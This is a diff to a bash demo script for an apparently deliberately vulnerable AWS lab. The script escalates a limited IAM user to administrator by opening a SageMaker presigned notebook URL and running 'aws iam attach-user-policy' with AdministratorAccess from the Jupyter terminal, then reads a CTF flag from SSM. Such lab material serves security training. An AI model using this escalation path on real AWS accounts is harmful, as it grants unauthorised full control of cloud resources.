@@ -261,86 +261,96 @@ echo -e "${YELLOW}$PRESIGNED_URL${NC}"
 echo ""
 echo -e "${BLUE}========================================${NC}\n"
 
-# Step 8: Provide instructions for manual browser access
-echo -e "${YELLOW}Step 8: Access the notebook via your web browser${NC}"
+# Step 8: Manual browser continuation — this step cannot be automated
+echo -e "${YELLOW}Step 8: Complete the attack via your web browser${NC}"
 echo ""
-echo -e "${YELLOW}MANUAL STEP REQUIRED:${NC}"
+echo -e "${YELLOW}MANUAL STEPS REQUIRED:${NC}"
 echo "1. Copy the presigned URL above"
 echo "2. Open it in your web browser"
 echo "3. Wait for Jupyter to load (may take 30-60 seconds)"
 echo "4. Once in Jupyter, click 'New' → 'Terminal' to open a terminal"
-echo "5. In the terminal, execute the following command:"
+echo "5. In the terminal, run:"
 echo ""
 echo -e "${GREEN}aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}"
 echo ""
-echo "6. The command will execute with the notebook's admin role credentials"
-echo "7. Press ENTER in this terminal when you've completed the above steps"
+echo "   The command runs with the notebook's admin role credentials."
 echo ""
-read -p "Press ENTER after executing the command in Jupyter terminal..."
+echo "6. After the command succeeds, verify admin access from a local terminal:"
+echo ""
+echo -e "${DIM}   AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID \\"
+echo "   AWS_SECRET_ACCESS_KEY=<secret> \\"
+echo -e "   aws iam list-users --max-items 3${NC}"
+echo ""
+echo "7. Then capture the CTF flag (once admin access is confirmed):"
+echo ""
+echo -e "${DIM}   aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-004-to-admin \\"
+echo -e "   --query 'Parameter.Value' --output text${NC}"
 echo ""
 
-# Step 9: Wait for IAM policy propagation
+# Restore helpful permissions before exit
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+# Non-interactive mode: exit 3 (signals "requires user interaction" to the test runner)
+if [ ! -t 0 ]; then
+    echo -e "${YELLOW}[Non-interactive] Exiting — browser step requires manual completion.${NC}"
+    exit 3
+fi
+
+# Interactive mode: wait for the user to complete the browser steps
+read -r -p "Press ENTER after executing the command in Jupyter terminal..."
+echo ""
+
+# [EXPLOIT] Step 9: Verify administrator access
 echo -e "${YELLOW}Step 9: Waiting for IAM policy changes to propagate${NC}"
 echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 echo -e "${GREEN}✓ Policy changes should now be effective${NC}\n"
 
-# [OBSERVATION] Step 10: Verify administrator access
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
-use_readonly_creds
-echo "Testing if we now have admin permissions..."
+use_starting_creds
 echo "Attempting to list IAM users..."
-
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
-    echo -e "${RED}✗ Failed to list users${NC}"
-    echo -e "${YELLOW}Note: IAM policy changes can take a few seconds to propagate${NC}"
-    echo -e "${YELLOW}Or you may not have executed the command in Jupyter terminal yet${NC}"
+    echo -e "${RED}✗ Failed to list users — was the Jupyter command executed?${NC}"
     exit 1
 fi
 echo ""
 
-# [EXPLOIT] Step 11: Capture the CTF flag
-echo -e "${YELLOW}Step 11: Capturing the CTF flag${NC}"
+# [EXPLOIT]
+# Step 11: Capture the CTF flag
+# Starting user now has AdministratorAccess attached via the Jupyter terminal step.
 use_starting_creds
-show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-004-to-admin --query 'Parameter.Value' --output text"
-FLAG_VALUE=$(aws ssm get-parameter \
-    --name /pathfinding-labs/flags/sagemaker-004-to-admin \
-    --query 'Parameter.Value' \
-    --output text)
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/sagemaker-004-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
 
-if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" == "null" ]; then
-    echo -e "${RED}Error: Could not retrieve CTF flag. Ensure admin access was successfully granted in Step 8.${NC}"
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
     exit 1
 fi
+echo ""
 
-echo -e "${GREEN}✓ CTF flag captured: $FLAG_VALUE${NC}\n"
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
-
-# Final summary
 echo -e "\n${GREEN}========================================${NC}"
 echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
-echo "1. Started as: $STARTING_USER (sagemaker:CreatePresignedNotebookInstanceUrl)"
-echo "2. Discovered target notebook: $NOTEBOOK_NAME (with admin execution role)"
-echo "3. Waited for notebook to be InService"
-echo "4. Generated presigned URL for notebook access"
-echo "5. Accessed Jupyter notebook via presigned URL in browser"
-echo "6. Opened terminal in Jupyter (which has admin role credentials)"
-echo "7. Executed AWS CLI command to grant AdministratorAccess to starting user"
-echo "8. Achieved: Full administrator access"
-echo "9. Captured CTF flag: $FLAG_VALUE"
+echo "1. Started as: $STARTING_USER (sagemaker:CreatePresignedNotebookInstanceUrl only)"
+echo "2. Discovered target notebook: $NOTEBOOK_NAME (execution role: AdministratorAccess)"
+echo "3. Generated presigned URL — grants browser access to Jupyter with the notebook's admin role"
+echo "4. Opened Jupyter terminal → ran AttachUserPolicy → granted AdministratorAccess to starting user"
+echo "5. Captured CTF flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo "  $STARTING_USER → CreatePresignedNotebookInstanceUrl"
-echo "  → Access Jupyter Terminal (with admin role credentials)"
-echo "  → AttachUserPolicy → Admin Access → (ssm:GetParameter) → CTF Flag"
+echo "  $STARTING_USER → (CreatePresignedNotebookInstanceUrl)"
+echo "  → Jupyter terminal inherits notebook's admin role"
+echo "  → (iam:AttachUserPolicy) → AdministratorAccess on $STARTING_USER"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -351,9 +361,9 @@ fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- AdministratorAccess policy attached to: $STARTING_USER"
-echo "- Presigned URL generated (expires in 12 hours)"
+echo "- Presigned URL generated (valid 12 hours): $NOTEBOOK_NAME"
 
-echo -e "\n${RED}⚠ Warning: AdministratorAccess policy attached to starting user${NC}"
+echo -e "\n${RED}⚠ Warning: AdministratorAccess policy is now attached to $STARTING_USER${NC}"
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
